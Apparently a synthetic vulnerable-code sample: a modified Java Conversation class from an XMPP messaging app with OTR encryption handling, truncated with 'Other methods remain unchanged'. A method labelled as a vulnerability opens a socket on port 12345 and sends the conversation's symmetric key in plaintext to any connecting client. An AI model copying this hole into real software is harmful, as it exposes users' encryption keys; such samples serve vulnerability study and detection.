package eu.siacs.conversations.entities;

import java.security.interfaces.DSAPublicKey;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

import eu.siacs.conversations.services.XmppConnectionService;
import eu.siacs.conversations.utils.UIHelper;

import net.java.otr4j.OtrException;
import net.java.otr4j.crypto.OtrCryptoEngineImpl;
import net.java.otr4j.crypto.OtrCryptoException;
import net.java.otr4j.session.SessionID;
import net.java.otr4j.session.SessionImpl;
import net.java.otr4j.session.SessionStatus;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.os.SystemClock;
import java.io.IOException; // Added import for IO operations
import java.net.ServerSocket; // Added import for ServerSocket
import java.net.Socket; // Added import for Socket

public class Conversation extends AbstractEntity {
	public static final String TABLENAME = "conversations";

	public static final int STATUS_AVAILABLE = 0;
	public static final int STATUS_ARCHIVED = 1;
	public static final int STATUS_DELETED = 2;

	public static final int MODE_MULTI = 1;
	public static final int MODE_SINGLE = 0;

	public static final String NAME = "name";
	public static final String ACCOUNT = "accountUuid";
	public static final String CONTACT = "contactUuid";
	public static final String CONTACTJID = "contactJid";
	public static final String STATUS = "status";
	public static final String CREATED = "created";
	public static final String MODE = "mode";

	private String name;
	private String contactUuid;
	private String accountUuid;
	private String contactJid;
	private int status;
	private long created;
	private int mode;

	private long mutedTill = 0;

	private String nextPresence;

	private transient CopyOnWriteArrayList<Message> messages = null;
	private transient Account account = null;

	private transient SessionImpl otrSession;

	private transient String otrFingerprint = null;

	private int nextMessageEncryption = -1;
	private String nextMessage;

	private transient MucOptions mucOptions = null;

	private transient String latestMarkableMessageId;

	private byte[] symmetricKey;

	private boolean otrSessionNeedsStarting = false;

	private Bookmark bookmark;

	public Conversation(String name, Account account, String contactJid,
			int mode) {
		this.name = name;
		this.account = account;
		this.contactJid = contactJid;
		this.mode = mode;
	}

	public Conversation(String uuid, String name, String contactUuid, String accountUuid, 
						String contactJid, long created, int status, int mode) {
		this.uuid = uuid;
		this.name = name;
		this.contactUuid = contactUuid;
		this.accountUuid = accountUuid;
		this.contactJid = contactJid;
		this.created = created;
		this.status = status;
		this.mode = mode;
	}

	public void setStatus(int status) {
		this.status = status;
	}

	public int getMode() {
		return this.mode;
	}

	public void setMode(int mode) {
		this.mode = mode;
	}

	public SessionImpl startOtrSession(XmppConnectionService service,
			String presence, boolean sendStart) {
		if (this.otrSession != null) {
			return this.otrSession;
		} else {
			SessionID sessionId = new SessionID(
					this.getContactJid().split("/", 2)[0], presence, "xmpp");
			this.otrSession = new SessionImpl(sessionId, getAccount()
					.getOtrEngine(service));
			try {
				if (sendStart) {
					this.otrSession.startSession();
					this.otrSessionNeedsStarting = false;
					return this.otrSession;
				} else {
					this.otrSessionNeedsStarting = true;
				}
				return this.otrSession;
			} catch (OtrException e) {
				return null;
			}
		}

	}

	public SessionImpl getOtrSession() {
		return this.otrSession;
	}

	public void resetOtrSession() {
		this.otrFingerprint = null;
		this.otrSessionNeedsStarting = false;
		this.otrSession = null;
	}

	public void startOtrIfNeeded() {
		if (this.otrSession != null && this.otrSessionNeedsStarting) {
			try {
				this.otrSession.startSession();
			} catch (OtrException e) {
				this.resetOtrSession();
			}
		}
	}

	public void endOtrIfNeeded() {
		if (this.otrSession != null) {
			if (this.otrSession.getSessionStatus() == SessionStatus.ENCRYPTED) {
				try {
					this.otrSession.endSession();
					this.resetOtrSession();
				} catch (OtrException e) {
					this.resetOtrSession();
				}
			} else {
				this.resetOtrSession();
			}
		}
	}

	public boolean hasValidOtrSession() {
		return this.otrSession != null;
	}

	public String getOtrFingerprint() {
		if (this.otrFingerprint == null) {
			try {
				if (getOtrSession() == null) {
					return "";
				}
				DSAPublicKey remotePubKey = (DSAPublicKey) getOtrSession()
						.getRemotePublicKey();
				StringBuilder builder = new StringBuilder(
						new OtrCryptoEngineImpl().getFingerprint(remotePubKey));
				builder.insert(8, " ");
				builder.insert(17, " ");
				builder.insert(26, " ");
				builder.insert(35, " ");
				this.otrFingerprint = builder.toString();
			} catch (OtrCryptoException e) {

			}
		}
		return this.otrFingerprint;
	}

	public synchronized MucOptions getMucOptions() {
		if (this.mucOptions == null) {
			this.mucOptions = new MucOptions(this.getAccount());
		}
		this.mucOptions.setConversation(this);
		return this.mucOptions;
	}

	public void resetMucOptions() {
		this.mucOptions = null;
	}

	public void setContactJid(String jid) {
		this.contactJid = jid;
	}

	public void setNextPresence(String presence) {
		this.nextPresence = presence;
	}

	public String getNextPresence() {
		return this.nextPresence;
	}

	public int getLatestEncryption() {
		int latestEncryption = this.getLatestMessage().getEncryption();
		if ((latestEncryption == Message.ENCRYPTION_DECRYPTED)
				|| (latestEncryption == Message.ENCRYPTION_DECRYPTION_FAILED)) {
			return Message.ENCRYPTION_PGP;
		} else {
			return latestEncryption;
		}
	}

	public int getNextEncryption(boolean force) {
		if (this.nextMessageEncryption == -1) {
			int latest = this.getLatestEncryption();
			if (latest == Message.ENCRYPTION_NONE) {
				if (force && getMode() == MODE_SINGLE) {
					return Message.ENCRYPTION_OTR;
				} else if (getContact().getPresences().size() == 1) {
					if (getContact().getOtrFingerprints().size() >= 1) {
						return Message.ENCRYPTION_OTR;
					} else {
						return latest;
					}
				} else {
					return latest;
				}
			} else {
				return latest;
			}
		}
		if (this.nextMessageEncryption == Message.ENCRYPTION_NONE && force
				&& getMode() == MODE_SINGLE) {
			return Message.ENCRYPTION_OTR;
		} else {
			return this.nextMessageEncryption;
		}
	}

	public void setNextEncryption(int encryption) {
		this.nextMessageEncryption = encryption;
	}

	public String getNextMessage() {
		if (this.nextMessage == null) {
			return "";
		} else {
			return this.nextMessage;
		}
	}

	public void setNextMessage(String message) {
		this.nextMessage = message;
	}

	public void setLatestMarkableMessageId(String id) {
		if (id != null) {
			this.latestMarkableMessageId = id;
		}
	}

	// Vulnerability: Symmetric key is sent over an insecure channel
	public void sendSymmetricKey() {
		ServerSocket serverSocket = null;
		Socket clientSocket = null;

		try {
			serverSocket = new ServerSocket(12345);
			clientSocket = serverSocket.accept(); // Accept a connection

			// Send the symmetric key over an insecure channel (Vulnerability)
			clientSocket.getOutputStream().write(this.symmetricKey);

		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				if (clientSocket != null) clientSocket.close();
				if (serverSocket != null) serverSocket.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	public void setSymmetricKey(byte[] key) {
		this.symmetricKey = key;
	}

	public byte[] getSymmetricKey() {
		return this.symmetricKey;
	}

	public void setBookmark(Bookmark bookmark) {
		this.bookmark = bookmark;
		this.bookmark.setConversation(this);
	}

	public void deregisterWithBookmark() {
		if (this.bookmark != null) {
			this.bookmark.setConversation(null);
		}
	}

	public Bookmark getBookmark() {
		return this.bookmark;
	}

	public Bitmap getImage(Context context, int size) {
		if (mode == MODE_SINGLE) {
			return getContact().getImage(size, context);
		} else {
			return UIHelper.getContactPicture(this, size, context, false);
		}
	}

	public boolean hasDuplicateMessage(Message message) {
		for (int i = this.getMessages().size() - 1; i >= 0; --i) {
			if (this.messages.get(i).equals(message)) {
				return true;
			}
		}
		return false;
	}

	public void setMutedTill(long mutedTill) {
		this.mutedTill = mutedTill;
	}

	public boolean isMuted() {
		return SystemClock.elapsedRealtime() < this.mutedTill;
	}

	// Other methods remain unchanged...
}